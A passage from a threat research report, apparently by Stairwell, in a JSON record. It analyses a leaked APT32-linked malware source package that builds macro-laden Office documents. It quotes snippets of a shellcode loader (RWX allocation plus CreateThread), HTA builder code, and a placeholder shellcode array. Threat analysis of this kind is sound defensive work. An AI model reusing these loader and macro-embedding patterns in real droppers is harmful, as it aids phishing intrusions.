{
    "id": "9bdb03e3-e7ff-4b7f-ae4b-a512074a525e",
    "created_at": "2023-09-12T02:06:37.965609Z",
    "updated_at": "2025-03-27T02:16:37.089156Z",
    "deleted_at": null,
    "sha1_hash": "4ea12d6ff75828a66b886906a8bc8196ed2a1fd3",
    "title": "Stairwell threat report - The origin of APT32 macros",
    "authors": "",
    "file_creation_date": "0001-01-01T00:00:00Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 2598751,
    "plain_text": "## The origin story of APT32 macros: The StrikeSuit Gift that keeps giving\n\n##### Threat research report\n\n###### Steve Miller, Sr. Threat Researcher Silas Cutler, Principal Reverse Engineer\n\n 27/04/22\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n# Table of contents\n\n**Prologue** **4**\n\n**Chapter I** **6**\n\nThe StrikeSuit Gift that keeps giving 6\n\nSummarizing the source 7\n\n**Chapter II** **10**\n\nA tale of three GUIs 11\n\n\nA song as old as rhyme: Office VBA macros 13\n\n**Chapter III** **15**\n\nLooking the gift horse in the mouth 16\n\nHow did the RAR get made? 16\n\nUnboxed source code projects at a glance 17\n\nWhat’s the deal with all this shellcode? 21\n\n\nThe one from ShellcodeLoader.vb 21\n\nThe one from test.doc 22\n\nThe one from RawShellcode 23\n\nThe typical VB macro content 25\n\n**Chapter IV** **27**\n\n\nStrikeSuit malware development conventions 28\n\nDocumenting antivirus and compatibility testing 28\n\nFeature testing, housekeeping, and fingerprints 29\n\nCleaning up the development mess with _Cleanup.bat 29\n\nVisual Studio Solution User Options (.suo) analysis 32\n\nDevelopment in progress 35\n\nTesting features and functions 35\n\n###### 2\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nBackup structure 35\n\nMacro comparisons 35\n\nBorrowed and repurposed open-source code 38\n\n**Chapter V** **40**\n\n\nStockpiling the unique toolmarks and indicators 41\n\nUsernames, handles, and hostnames 41\n\nDistinct macro timestamps from a scheduled task XML file 41\n\nTesting the export of scheduled tasks XML 42\n\nDeveloper fingerprints in scheduled task XML 48\n\n\nNetwork-based indicators 49\n\nPDB paths 49\n\nThreadwork of attribution and assessing connections to APT32 52\n\nShellcodeLoader L.dll 52\n\nXML timestamps 53\n\nObfuscationHelper.cs 55\n\nAPT32 then and now 61\n\n\n**Epilogue** **66**\n\n**Appendix** **68**\n\nYARA rules 69\n\nVTI queries 71\n\n\n“Indicators” 72\n\nLinks and references 72\n\nAPT32 by year 72\n\nOffice macros 73\n\nVisual Studio 2022 73\n\n###### 3\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n# Prologue\n\n“The Gifts of an Enemy are Justly to be Dreaded”\n\nVoltaire\n\n\n###### 4\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nEveryone loves an origin story. When the world learns of new malware and attacks, we are often left\npondering the motivations, mulling over the attribution, and sifting through the nitty-gritty bits and\nbytes to understand the TTPs and tradecraft. Why was it done, who was behind it, and how did they do\nit? Analysts, researchers, and investigators of all sorts spend time plotting the dots, drawing\nconnections between data points, helping the evidence speak, and passing judgment on areas of\nuncertainty.\n\nWhen we dive deep into malware and attacks, we often are left interpreting nuanced artifacts to help us\nget a glimpse into the original malware development environment. We look to debug information and\n[PDB paths to make inferences about the developer workstations. We look to the](https://www.mandiant.com/resources/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware) [Rich header metadata](https://www.youtube.com/watch?v=ipPAFG8qtyg&t=1s)\nto help understand the specifics of the linker, compiler, and architecture of the original development\nmachine. We examine [specific malicious functions](https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/) within a piece of malware to identify code reuse. We\nidentify notable libraries to tease out [pieces of software that may be borrowed](https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf) from public projects\naround the internet.\n\nPart of the fun of analysis is the challenge of the puzzle and the relentless pursuit of insight in the face\nof complex, limited, or opaque data. Yet, sometimes we get lucky, and we stumble on a piece of\nmalware source code to get a more intimate look at the malware author, a clearer window into the\noriginal development environment, and a naked look at the malware itself.\n\nThis origin story is for all you Visual Basic macro fans out there. In this report, we unearth a demon from\nthe ancient world: a mysterious malware source code package called StrikeSuit Gift. We examine this\nsource code package in detail and dive deep into development conventions, tradecraft, toolmarks, and\npotential connections to the threat actor APT32.\n\n###### 5\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n# Chapter I\n\n“Gifts are scorned where givers are despised”\n\nDryden\n\n\n###### 6\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n#### The StrikeSuit Gift that keeps giving\n\nOur thirst for knowledge leads us back in time to the foregone world of 2017. The year was a dystopia\nof its own, yet it was the golden age of APT32. The prolific Vietnam-based threat actor was running\nwild, targeting foreign governments, dissidents, journalists, and pretty much any private corporation\ntrying to do business in Vietnam. APT32, also known by “OceanLotus'' and “BISMUTH,” is famous for\ninnovating and bypassing defenses using a combination of custom-developed, open-source, and\ncommercially available tooling to perform intrusion activities. Like many threat actors, APT32 favors\nphishing via lure documents laden with malicious macros to execute or download a piece of malware.\n\nThrough following the breadcrumbs of historical macro content, we stumbled across an archive\nsubmitted to VirusTotal in late 2017. This archive contains a litany of malware source code, shellcode,\ntest files, documents, macros, notes, and more, all of which could span nearly a decade of malware\ndevelopment. This malware source package is internally named StrikeSuit Gift. Though it appears to be\ndeveloped years ago, dissecting this malware may give us insights into the practices used by malware\ndevelopers today. Furthermore, through inspection of the minutiae, we may establish links to support\nthe gut notion that this source code package was developed or used by APT32.\n\n#### Summarizing the source\n\nOccasionally, malware developers will inadvertently leak source code packages by triggering antivirus\nor endpoint detection products. Once the security vendor has a copy of the malware file, it may be\nshared or otherwise proliferated around the globe through data-sharing partnerships, backchannel\nexchanges, and product integrations. Eventually, all roads lead to Rome. The StrikeSuit Gift source\npackage was submitted to VirusTotal at 2017-08-26 07:29:19 UTC.\n\nThe StrikeSuit Gift package is a 2.99MB RAR archive containing over 200 files, most of which are Visual\nStudio solutions or source code in a couple of programming languages. This package also includes test\ndocuments, text files, built executables, and a couple of other RAR and ZIP files.\n\nThere’s a lot of data here and multiple timelines to look at. To help illustrate this package at a high level,\nhere’s a look at the directory tree three levels deep with parentheses to show the last modified\ntimestamp, according to WinRAR. These timestamps are squirrely and imperfect, but they suggest a\ngeneral timeline and give us a sense of recency that we can dive into in more detail later.\n\nFile tree of StrikeSuit Gift RAR 2cac346547f90788e731189573828c53\n\n```\nP17028 - StrikeSuit Gift - Office Macro Type 1 (2017-08-25 21:32)\n\n```\n\n###### 7\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\n├── AVs-Test            (2017-08-25 03:10)\n│  └── Result.txt\n├── Office-Versions        (2017-08-25 21:32)\n│  └── Verions.txt\n├── ReadMe.txt           (2017-08-10 01:25)\n├── Reference\n│  ├── Macros_Builder\n│  │  ├── Macros_Builder     (2017-08-24 01:21)\n│  │  ├── Macros_Builder.sln\n│  │  ├── Macros_Builder.v11.suo\n│  │  └── _Cleanup.bat      (2013-10-29 00:18)\n│  ├── Macros_Builder_1.0.zip\n│  │  └── Macros_Builder     (2016-04-19 05:32)\n│  ├── RawShellcode        (2017-08-23 00:24)\n│  │  └── 2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin\n│  ├── WebBuilder\n│  │  ├── HtaDotNet       (2017-08-24 01:21)\n│  │  └── ShellcodeLoader    (2017-08-18 04:50)\n│  └── WebBuilder.rar\n│  │  └── WebBuilder       (2011-09-23 20:30)\n│  │    ├── HtaDotNet     (2011-09-23 20:30)\n│  │    └── ShellcodeLoader  (2011-09-23 20:30)\n└── Source\n  ├── CSharp           (2017-08-23 21:30)\n  │  ├── MacrosEmbedding    (2017-08-18 00:18)\n  │  ├── MacrosEmbeddingExample (2017-08-13 19:52)\n  │  └── VbaCodeCreator     (2017-08-23 21:30)\n  ├── C_Cpp           (2017-08-23 03:45)\n  │  ├── Binary         (2017-08-24 01:21)\n  │  └── ShellcodeThreadCaller (2017-08-24 01:21)\n  └── VB             (2017-08-20 21:23)\n     ├── ShellcodeLoader    (2017-08-20 21:23)\n     └── XmlScriptAnalyst    (2017-08-16 20:17)\n\n```\n\nAt first glance, we can see that in August 2017 this project was in active development. It seems that the\nmalware author may have brought in older projects and files from years past. These files may have been\narchives of their own and are kept in the directory structure for reference or in the event the developer\nneeds to pull the ripcord and recover the original, older code.\n```\nMacros_Builder was from 2016 and got new updates in August 2017. HtaDotNet and\nShellcodeLoader are older, maybe as far back as 2011, but were both touched in August 2017. A\n\n```\ncleanup batch script may have been created or used as far back as 2013 but was copied over to help\ndelete extraneous development artifacts. We will dive into more details further down the page, but we\n\n###### 8\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nthink the superficial totality of these timestamps shows a developer who is leaning on old code, making\nimprovements, performing tests, and enhancing a small set of interconnected malware tools.\n\n###### 9\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n# Chapter II\n\n“Unwelcome is the gift which is held long in the hand”\n\nSeneca\n\n###### 10\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n#### A tale of three GUIs\n\nWithin the delicate web of source code lie three juicy GUIs for us to behold. We begin with the oldest\nand jump further back in time to October 2013, when a malware developer compiled a debug build of\n```\nOffice Macros Builder - Version 1.0.0 at 2013-10-08 16:00:51. This GUI tool is to help a\n\n```\nlegion of intrusion operators inject macros into Office documents.\n\nGUIs for hacking tools and malware kits exist to help intrusion operators perform complex tasks quickly,\neasily, repeatedly, and reliably. GUIs help scale out capabilities across a workforce of varying roles,\nskills, and experience levels. Once you can make it an easy button, almost anyone can smash it to\nunleash their evils.\n\nThe Office Macros Builder - Version 1.0.0 above accepts an Office file (.doc) and a macros\n(.vb or .txt) and uses Microsoft.Office.Interop.Word and Microsoft.Vbe.Interop assemblies to jam the\nmacro into the document. The program takes the document and creates an alternate data stream (ADS)\nwith a Zone Identifier of 0 to indicate that it is from “URLZONE_LOCAL_MACHINE,” the most trusted\nzone.\n\n###### 11\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nTime marches on, and we fast forward to spring 2016. Somewhere around the world, the development\nteam behind StrikeSuit Gift starts their morning with coffee and pastries and compiles the GUI program\n```\nEmbed Office Macros at 2016-03-11 09:02:13.\n\n```\nWe jump ahead to 2017 when the [threat actor is outed by Mandiant. The bosses demand an upgrade](https://www.mandiant.com/resources/cyber-espionage-apt32)\nfrom their malware development team. Now, the malware developer Rachael is suddenly tasked to\nenhance an older codebase to make it a bit more versatile for intrusion operations. Rachael begins\nwith some slight modifications to the older macro text, add_schedule_vba.txt, makes some\nenhancements to the GUI, and then compiles the new version of Embed Office Macros at\n```\n8/17/2017 08:18:44.\n\n###### 12\n\n```\n\n-----\n\nWhile looking at the pretty pictures may not give us foresight into the future of this malware toolkit, the\nvisual progression of these GUIs is important because this is where the many malware functionalities\nbear fruit. These GUIs represent the final vehicles for mass malware operations and will be used to\ncreate hundreds, if not thousands, of malicious macros for Office documents.\n\n#### A song as old as rhyme: Office VBA macros\n\nLet’s take a quick break from the timeline and recap the ever-loathed scourge of the infosec world:\nMicrosoft Office macros.\n\n###### 13\n\n\n###### THREAT RESEARCH REPORT\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nVisual Basic (VB), Visual Basic Scripts (VBS), and Visual Basic for Applications (VBA) are basically the\nsame programming language, except that VBA is designed to run within a Microsoft Office application\nsuch as Word, Excel, PowerPoint, etc. In the context of malware and phishing documents, we often just\n[refer to any VB scripting content as “macros.”](https://www.ncsc.gov.uk/guidance/macro-security-for-microsoft-office)\n\nEvery IT administrator and business person will tell you that macros have a legitimate purpose and are\nintegral to crucial company processes. The supposed legitimate purpose is exactly why malicious\nmacros are so effective in phishing campaigns. Macros are so common in cross-company,\ncross-business processes that many users are easily coerced into executing even the malicious ones.\nAttackers know this and act accordingly.\n\nIf you’re new to VB macros or maybe want a quick refresher, we recommend these great reads to recap\nwhat macros are and examples of how they may show up in phishing or lure documents:\n\n  - [https://www.ncsc.gov.uk/guidance/macro-security-for-microsoft-office](https://www.ncsc.gov.uk/guidance/macro-security-for-microsoft-office)\n\n  - [https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/](https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/)\n\n  - [https://redcanary.com/blog/malicious-excel-macro/](https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/)\n\n  - [https://twitter.com/JohnLaTwC/status/775689864389931008](https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/)\n\n###### 14\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n# Chapter III\n\n“To the noble mind, rich gifts wax poor when givers prove unkind.”\n\nShakespeare\n\n###### 15\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nNow, we’ll jump to late August 2017 when someone on the malware development or operation team\nmakes a crucial mistake. Rachael or one of their counterparts transfers the RAR archive of StrikeSuit\nGift to a machine with antivirus software running. The embedded shellcode and macro content inside of\nthe RAR trigger an AV signature, and the archive file is hoovered up and blasted across the internet.\nThose monitoring recent submissions to VirusTotal would see an alert for the YARA rule\n“APT32_ActiveMime_Lure” and arrive at the RAR archive for StrikeSuit Gift.\n\n#### Looking the gift horse in the mouth\n\nIt's tough to analyze this much malware source code line by line, so let’s do our best to summarize the\nhigh points and tease out juicy deets that may be interesting to our understanding of the actor’s\ncapabilities, the development tradecraft, and then we can connect what we’re seeing here to attacks\nout in the world.\n\n#### How did the RAR get made?\n\nWe do not have many clues to describe how the main RAR file was created; however, we can take an\neducated guess that it was created with WinRAR 4.x for the folder on the mounted volume D:\\P17028\n```\n- StrikeSuit Gift - Office Macro Type 1.\n\n```\nInside the main RAR file (MD5 2cac346547f90788e731189573828c53), we see that the archive stores\neach of the archived files and directories with a four-byte “mtime” timestamp, likely representing the\nNTFS last modified time from Windows.\n\nIf we open this RAR file with WinRAR, the utility identifies this as RAR 4.x archive. According to the\ndocumentation, the RAR 4.x format stores the last modified timestamps in local time rather than UTC.\nThis is not important as we’re skeptical about timestamps to begin with but good to know that in older\nversions of WinRAR, we should see a four-byte combo of MS-DOS TIME and DATE local timestamps.\n\nIn modern versions of WinRAR, the default is “high-precision” eight-byte uint64 Windows FILETIME UTC\ntimestamps; however, if we deselect the high-precision flag, the timestamp becomes a four-byte uint32\nUnix time_t. Isn’t forensics fun?\n\nThese three examples were created based on the original StrikeSuit Gift RAR file, looking at the RAR\nlast modified timestamp for \\Office-Versions\\Verions.txt. We took this file and re-archived it\nusing a modern WinRAR both with and without the high-precision flag, and the time there reflects a +5\nadjustment for the UTC offset on our test system. We can convert any of these raw timestamps back to\na human time to see the approximate modification time.\n\n###### 16\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nExamples of three possible archive timestamps made by WinRAR of different versions.\n\n**Last Modified Hex** **Time Type** **Human Time** **WinRAR**\n\n`84 B1 19 4B` MS-DOS TIME + DATE [8/25/2017 22:12:08*](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')To_Binary('Space',8)&input=ODQgQjEgMTkgNEI) 4.x\n\n`52 DB FE 19 19 1E D3 01` Windows FILETIME [8/26/2017 03:12:08](https://gchq.github.io/CyberChef/#recipe=Windows_Filetime_to_UNIX_Timestamp('Seconds%20(s)','Hex%20(little%20endian)')From_UNIX_Timestamp('Seconds%20(s)')&input=NTJEQkZFMTkxOTFFRDMwMQ) 5.0+\n\n`08 E7 A0 59` Unix time_t [8/26/2017 03:12:08](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)From_Base(16)To_Base(10)From_UNIX_Timestamp('Seconds%20(s)')&input=MDhFN0EwNTk) 5.0+\n\n*Nuanced: We can try doing it based on [this approach, or we can try this (easier?)](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-dosdatetimetofiletime) [manual approach](https://www.doubleblak.com/m/blogPosts.php?id=7#dosTime) with the endian swap\n[binary output in CyberChef.](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')To_Binary('Space',8)&input=ODQgQjEgMTkgNEI)\n\nTo sum all of that up, we can guess based on the age of the StrikeSuit Gift RAR file that this was\ncreated with an old 4.x version of WinRAR, and we can confirm that with the structure of the archive\nheaders and the format of the now deprecated DOS-style timestamps. Ok, let’s power forward to the\ngood stuff.\n\n#### Unboxed source code projects at a glance\n\nTo help us get a broad vision of all the source code in our StrikeSuit Gift package, we take a high-level\nlook at the main projects.\n\nParent Directory: P17028 - StrikeSuit Gift - Office Macro Type 1\n\n**Project** **Summary**\n```\n Macros_Builder Macros_Builder.sln - Visual Studio 2012\n\n```\nThis GUI program “Embed Office Macros” was created in 2016 and\nmodernized in August 2017.\n\nThe main program defines macro file add_schedule_vba.txt as a resource,\nthen the main routine takes that macro and replaces variables from things in GUI\nand writes out to MacrosSource.txt. The program has a separate functionality\nto take a GUI selected file and use Trinet.Core.IO.Ntfs to write an Alternate\nData Stream (ADS) Zone Identifier to 2.\n\n###### 17\n\n|Last Modified Hex|Time Type|Human Time|WinRAR|\n|---|---|---|---|\n|84 B1 19 4B|MS-DOS TIME + DATE|8/25/2017 22:12:08*|4.x|\n|52 DB FE 19 19 1E D3 01|Windows FILETIME|8/26/2017 03:12:08|5.0+|\n|08 E7 A0 59|Unix time_t|8/26/2017 03:12:08|5.0+|\n\n|Project|Summary|\n|---|---|\n|Macros_Builder|Macros_Builder.sln - Visual Studio 2012 This GUI program “Embed Office Macros” was created in 2016 and modernized in August 2017. The main program defines macro file add_schedule_vba.txt as a resource, then the main routine takes that macro and replaces variables from things in GUI and writes out to MacrosSource.txt. The program has a separate functionality to take a GUI selected file and use Trinet.Core.IO.Ntfs to write an Alternate Data Stream (ADS) Zone Identifier to 2.|\n\n\n-----\n\n|Col1|Col2|\n|---|---|\n|WebBuilder/ HtaDotNet|HtaDotnet.sln - Visual Studio 2012 This solution has several components. The first is the HtaDotnet project which appears to have UI components and serves as a framework to embed shellcode and file data into an HTA document with either VB script or JavaScript. This has two resource objects DotNet4Ldr and DotNetLdr which appear to be serialized versions of L.dll (see ShellcodeLoader, below). The Test project uses HtaDotnet to manually build an HTA file based on hard-coded paths for shellcode, a file, and a file name. byte[] shellcode = File.ReadAllBytes(@\"c:\\temp\\shl.bin\"); byte[] embedFileData = File.ReadAllBytes(@\"c:\\temp\\bintext.exe\"); string embedFileName = \"中文(简体).exe\"; … HtaDotNetBuilder builder = new HtaDotNetBuilder(); byte[] hta = builder.BuildHtaDotnetLdr( engine, shellcode, embedFileName, embedFileData ); File.WriteAllBytes(@\"c:\\temp\\11.hta\", hta);|\n|WebBuilder/ ShellcodeLoader|L.sln - Visual Studio 14, 14.0.25420.1 (was migrated, see UpgradeLog.htm) This solution is a set of functions that help with decoding, decrypting, and running shellcode, including that which may be in a text in a .HTA or .VBS file. The L class is designed to take some script content and decode or decrypt it into shellcode and execute it. The Test piece uses the L class and takes an input shellcode file, an input loader file (“L.dll”), two VB loader resources, and outputs into a text file. string inputShellcodeFile = @\"G:\\WebBuilder\\Gift_HtaDotNet\\_Temp\\shl.bin\";|\n\n\n###### THREAT RESEARCH REPORT\n\n\n###### 18\n\n\n-----\n\n|Col1|string inputLdrFile = @\"G:\\WebBuilder\\Gift_HtaDotNet\\ShellcodeLoader\\L\\bin\\release\\l.dl l\"; string outputFile = @\"c:\\temp\\l.txt\"; string vbsLdrCompatFile = @\"c:\\temp\\DotNetLdr\"; string vbsLdrCompatFileDotNet4 = @\"c:\\temp\\DotNet4Ldr\";|\n|---|---|\n|CSharp/ MacrosEmbedding|MacrosEmbedding.sln - Visual Studio 14, 14.0.25420.1 This GUI program “Office Macros Builder” was created in 2013. It checks GUI for inputs of an Office (.doc) and a macro file (.vb or .txt) and attempts to embed macro into a file (with some basic error handling) and tries to adjust ADS zone identifiers to 0.|\n|CSharp/ MacrosEmbeddingExample|MacrosEmbeddingExample.sln - Visual Studio 14, 14.0.25420.1 This is likely a precursor or run alongside MacrosEmbedding to test macros embedding functionality. It creates a simple VB macro text, has an embedMacro function to embed a macro into a doc, and the main function takes hard-coded paths from the developer system and runs it. string pathDoc = @\"C:\\Users\\Rachael\\Desktop\\MacrosTest.doc\"; We see the function embedMacros from this expanded upon in both other CSharp/ solutions: MacrosEmbedding, and VbaCodeCreator.|\n|CSharp/ VbaCodeCreator|VbaCodeCreator.sln - Visual Studio 14, 14.0.25420.1 This Visual Studio project is used to generate VB macros that can be bundled into documents. The main program takes two hard-coded paths, one for shellcode and one for an Office document, then runs the core to build the shellcode into it. string strShellcodePath = @\"D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\RawShellcode\\2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin\"; string strOfficeFilePath = @\"C:\\Users\\Rachael\\Desktop\\test.doc\"; Core.Core.startBuilder(strShellcodePath, strOfficeFilePath);|\n\n\n###### THREAT RESEARCH REPORT\n\n\n###### 19\n\n\n-----\n\n|Col1|Along with this project in the debug directory, we keep a copy of test.doc and a handful of legitimate Microsoft Office binaries to support the functionalities. Test.doc has a Module1.bas VBA code stream that uses an old public VB script template but then has a function for shellcode as an array. The shellcode in the existing test.doc is a test file similar, if not identical, to the “RawShellcode” file 2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin|\n|---|---|\n|C_Cpp/ Binary|Binary.sln - Visual Studio 2012 This reads in a shellcode blob, converts the binary to text, and writes to an output .dat file. int main(int argc, char **argv) { std::string strFilePath = \"D:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Reference\\\\RawShellcode\\\\2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin\"; std::vector<BYTE> data; data = Binary::ReadBinaryFile(strFilePath); Binary::ConvertBinaryToText(\"C:\\\\Users\\\\Rachael\\\\Desktop\\\\shellco de.dat\", data);|\n|C_Cpp/ ShellcodeThreadCaller|ShellcodeThreadCaller.sln - Visual Studio 2012 This reads in shellcode from a hard-coded path and executes it. HANDLE hFile = CreateFileA(\"C:\\\\Users\\\\Rachael\\\\Desktop\\\\2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin\", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); LPVOID lpShellcodeAddr = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpShellcodeAddr, NULL, 0, NULL); WaitForSingleObject(hThread, INFINITE);|\n|VB/ ShellcodeLoader|ShellcodeLoader.sln - Visual Studio 2012 This is a different ShellcodeLoader than the L.dll one in WebBuilder.|\n\n\n###### THREAT RESEARCH REPORT\n\n\n###### 20\n\n\n-----\n\n|Col1|In this solution, the main ShellcodeLoader.vb routine uses the Metasploit VB generated template (à la scriptjunkie), comments out the Meterpreter-esque shellcode array, and instead reads the local test shellcode blob as the main variable. Hyeyhafxp = My.Computer.FileSystem.ReadAllBytes(\"./2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin\")|\n|---|---|\n|VB/ XmlScriptAnalyst|XmlScriptAnalyst.sln - Visual Studio 2012 This appears to be a test project to test VB code against the local system and builds an XML scheduled task based on VB functions. When run, it grabs the local system computer and user name, then writes this into an XML string, which is then written out to a hard-coded path XmlStr.txt. This relates to the XML functionality brought into an updated version of Macros_Builder.|\n\n\n###### THREAT RESEARCH REPORT\n\n\n#### What’s the deal with all this shellcode?\n\nInterwoven through the StrikeSuit Gift package, amidst the varying projects, solutions, and macros, are\na handful of shellcode blobs. Are they malware? What are they? Why are they here? Let’s find out.\n\n###### The one from ShellcodeLoader.vb\n\nFile Path: P17028 - StrikeSuit Gift - Office Macro Type\n```\n1\\Source\\VB\\ShellcodeLoader\\ShellcodeLoader\\ShellcodeLoader.vb\n\n```\n\nMD5 of Decoded Raw Shellcode: 509d2e572bd945a2afb4a52d5acd7bec\n\n\nFile Size: 195b\n\n\nThis array is the default shellcode blob originally seen in ShellcodeLoader.vb, though it is\ncommented out.\n\n```\n'Hyeyhafxp = {232, 137, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82,\n20, _\n'139, 114, 40, 15, 183, 74, 38, 49, 255, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, _\n'13, 1, 199, 226, 240, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, _\n'116, 74, 1, 208, 80, 139, 72, 24, 139, 88, 32, 1, 211, 227, 60, 73, 139, 52, 139, 1, _\n\n```\n\n###### 21\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\n'214, 49, 255, 49, 192, 172, 193, 207, 13, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, _\n'36, 117, 226, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, _\n'139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, _\n'235, 134, 93, 106, 1, 141, 133, 185, 0, 0, 0, 80, 104, 49, 139, 111, 135, 255, 213, 187, _\n'224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, _\n'187, 71, 19, 114, 111, 106, 0, 83, 255, 213, 99, 97, 108, 99, 0}\n\n```\n\n[With some fiddling we can take this array and, by using Cyberchef, perform a From Decimal and dump](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)MD5(/disabled)&input=MjMyIDEzNyAwIDAgMCA5NiAxMzcgMjI5IDQ5IDIxMCAxMDAgMTM5IDgyIDQ4IDEzOSA4MiAxMiAxMzkgODIgMjAgMTM5IDExNCA0MCAxNSAxODMgNzQgMzggNDkgMjU1IDQ5IDE5MiAxNzIgNjAgOTcgMTI0IDIgNDQgMzIgMTkzIDIwNyAxMyAxIDE5OSAyMjYgMjQwIDgyIDg3IDEzOSA4MiAxNiAxMzkgNjYgNjAgMSAyMDggMTM5IDY0IDEyMCAxMzMgMTkyIDExNiA3NCAxIDIwOCA4MCAxMzkgNzIgMjQgMTM5IDg4IDMyIDEgMjExIDIyNyA2MCA3MyAxMzkgNTIgMTM5IDEgMjE0IDQ5IDI1NSA0OSAxOTIgMTcyIDE5MyAyMDcgMTMgMSAxOTkgNTYgMjI0IDExNyAyNDQgMyAxMjUgMjQ4IDU5IDEyNSAzNiAxMTcgMjI2IDg4IDEzOSA4OCAzNiAxIDIxMSAxMDIgMTM5IDEyIDc1IDEzOSA4OCAyOCAxIDIxMSAxMzkgNCAxMzkgMSAyMDggMTM3IDY4IDM2IDM2IDkxIDkxIDk3IDg5IDkwIDgxIDI1NSAyMjQgODggOTUgOTAgMTM5IDE4IDIzNSAxMzQgOTMgMTA2IDEgMTQxIDEzMyAxODUgMCAwIDAgODAgMTA0IDQ5IDEzOSAxMTEgMTM1IDI1NSAyMTMgMTg3IDIyNCAyOSA0MiAxMCAxMDQgMTY2IDE0OSAxODkgMTU3IDI1NSAyMTMgNjAgNiAxMjQgMTAgMTI4IDI1MSAyMjQgMTE3IDUgMTg3IDcxIDE5IDExNCAxMTEgMTA2IDAgODMgMjU1IDIxMyA5OSA5NyAxMDggOTkgMA)\n[out the raw hex. We can hash it into MD5: 509d2e572bd945a2afb4a52d5acd7bec. When we pull this](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)MD5(/disabled)&input=MjMyIDEzNyAwIDAgMCA5NiAxMzcgMjI5IDQ5IDIxMCAxMDAgMTM5IDgyIDQ4IDEzOSA4MiAxMiAxMzkgODIgMjAgMTM5IDExNCA0MCAxNSAxODMgNzQgMzggNDkgMjU1IDQ5IDE5MiAxNzIgNjAgOTcgMTI0IDIgNDQgMzIgMTkzIDIwNyAxMyAxIDE5OSAyMjYgMjQwIDgyIDg3IDEzOSA4MiAxNiAxMzkgNjYgNjAgMSAyMDggMTM5IDY0IDEyMCAxMzMgMTkyIDExNiA3NCAxIDIwOCA4MCAxMzkgNzIgMjQgMTM5IDg4IDMyIDEgMjExIDIyNyA2MCA3MyAxMzkgNTIgMTM5IDEgMjE0IDQ5IDI1NSA0OSAxOTIgMTcyIDE5MyAyMDcgMTMgMSAxOTkgNTYgMjI0IDExNyAyNDQgMyAxMjUgMjQ4IDU5IDEyNSAzNiAxMTcgMjI2IDg4IDEzOSA4OCAzNiAxIDIxMSAxMDIgMTM5IDEyIDc1IDEzOSA4OCAyOCAxIDIxMSAxMzkgNCAxMzkgMSAyMDggMTM3IDY4IDM2IDM2IDkxIDkxIDk3IDg5IDkwIDgxIDI1NSAyMjQgODggOTUgOTAgMTM5IDE4IDIzNSAxMzQgOTMgMTA2IDEgMTQxIDEzMyAxODUgMCAwIDAgODAgMTA0IDQ5IDEzOSAxMTEgMTM1IDI1NSAyMTMgMTg3IDIyNCAyOSA0MiAxMCAxMDQgMTY2IDE0OSAxODkgMTU3IDI1NSAyMTMgNjAgNiAxMjQgMTAgMTI4IDI1MSAyMjQgMTE3IDUgMTg3IDcxIDE5IDExNCAxMTEgMTA2IDAgODMgMjU1IDIxMyA5OSA5NyAxMDggOTkgMA)\n[snippet of shellcode up with the tool scdbg, we see that it probably is just a placeholder that uses](http://sandsprite.com/blogs/index.php?uid=7&pid=152)\nWinExec to open passed arguments. That makes sense because (through Googling around the strings)\nwe can see that this shellcode is borrowed verbatim from several open source code projects\n[surrounding Metasploit VB macros, like this blog post by @scriptjunkie in 2012. It was later tweaked,](https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/)\nforked, and copied into a variety of 